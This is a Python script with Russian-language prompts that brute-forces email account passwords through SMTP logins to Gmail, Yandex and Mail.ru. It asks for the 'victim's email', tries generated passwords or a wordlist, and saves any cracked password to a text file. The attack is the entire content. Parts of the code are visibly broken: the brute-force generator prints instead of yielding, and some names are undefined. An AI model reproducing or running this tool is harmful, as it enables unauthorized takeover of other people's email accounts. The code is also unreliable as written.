import smtplib
import itertools
import os
from time import sleep
from threading import *
from colorama import init
init()

print("         _                           ______           ")
print("	| |                         (____  \             _   ")
print("	| |      ____ _____ _   _    ____)  ) ____ _   _| |_ ")
print("	| |     / _  (___  ) | | |  |  __  ( / ___) | | |  _)")
print("	| |____( ( | |/ __/| |_| |  | |__)  ) |   | |_| | |_ ")  
print("	|_______)_||_(_____)\__  |  |______/|_|    \____|\___)")
print("	                   (____/                            ")
																															  
print		("\nЭта утилита для ленивого взлома паролей от почты.")
print                    ("[+] Coded by Cat0dz [+]")
print               ("[+] Переведенно на русский BITIW [+]")
user = input("Введите почту жертвы: ")	
protocol = "tls"
if 'gmail' in user:
    server = "gmail.com"
    port = 587
elif 'yandex' in user:
    server = "yandex.ru"
    port = 465
    protocol = "ssl"
elif 'mail' in user:
    server = "mail.ru"
    port = 465
    protocol = "ssl"

print('\033[35m' +"Подключаюсь...")
Kira = 0
print('\033[37m')
if protocol == "ssl":
 smtpserver_server = smtplib.SMTP_SSL("smtp."+server,port)
elif protocol == "tls":
 smtpserver_server = smtplib.SMTP("smtp."+server,port)
smtpserver_server.ehlo()
smtpserver_server.ehlo()
print("Подключён к серверу, готов к атаке.")

method = input("\nВыберите метод атаки => (a)Брутфорс (b)Список паролей : ")
perf = input("\nВключть модификации для Raspberry PI?[y/n] : ")
if perf == "y" or perf =="Y":
 Kira = 0.0002;
if method == "a":
    min_pass = int(input("Введите минимальный размер пароля(Обычно:8): "))
    print ("\nВы собираетесь атаковать почту: "+'\033[43m'+user)
    print('\033[37m')
    verify2 = input ("Всё верно? [y/n]: ")
    if verify2 == "y" or verify2 == "Y":
        def print_perms(chars, minlen, maxlen): 
            for n in range(minlen, maxlen+1): 
                for perm in itertools.product(chars, repeat=n): 
                    sleep(Kira)
                    print(''.join(perm)) 
            
    print_perms ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!#$%&'*+-/=?^_`{|}~;", min_pass, 64)

    for password in print_perms:
        try:
            smtpserver_server.login(user, password)
            print (Fore.GREEN+"[+] Пароль подобран: "+Fore.GREEN+ password)
            print('\033[39m')
            input("Нажми ENTER что бы сохранить как txt .txt")
            file = open("password cracked.txt","w")
            file.write("Емейл: ")
            file.write(user)
            file.write("Пароль: ")
            file.write(password)
            file.close()
            input("Пароль сохранен! Ищи <password cracked.txt> в папке с брутером")
            break
        except smtplib.SMTPAuthenticationError:
            print ('\033[31m'+"[!] пароль неверен: "+'\033[32m'+ password)
    if verify2 == "n" or verify2 == "N":   
        quit()


class Core1(Thread):
     def run(self):
        for password in passwfile:
            try:
                smtpserver_server.login(user, password)
                print (Fore.GREEN+"[+] Пароль подобран: "+Fore.GREEN+ password)
                print(Fore.GREEN)
                input("Нажми ENTER что бы сохранить как txt .txt")
                file = open("password cracked.txt","w")
                file.write("Email: " + user)
                file.write("Пароль: " + password)
                file.close()
                input(Fore.GREEN+"Пароль сохранен! Ищи <password cracked.txt> в папке с брутером")
                t1.join()
                t2.join()
                break
            except smtplib.SMTPAuthenticationError:
                print ('\033[31m'+"[!] Incorrect Password: "+ password)

if method == "b":
    passwfile = input("Введите путь до словаря: ")
    passwfile = open(passwfile, "r")
    reversedpasswfile = input("Введите ещё раз: ")
    with open(reversedpasswfile) as f,  open('reversed_wordlist.txt', 'w') as fout:
        fout.writelines(reversed(f.readlines()))
    reversedpasswfile = open("reversed_wordlist.txt", "r")
    t1 = Core1()
    t1.start()
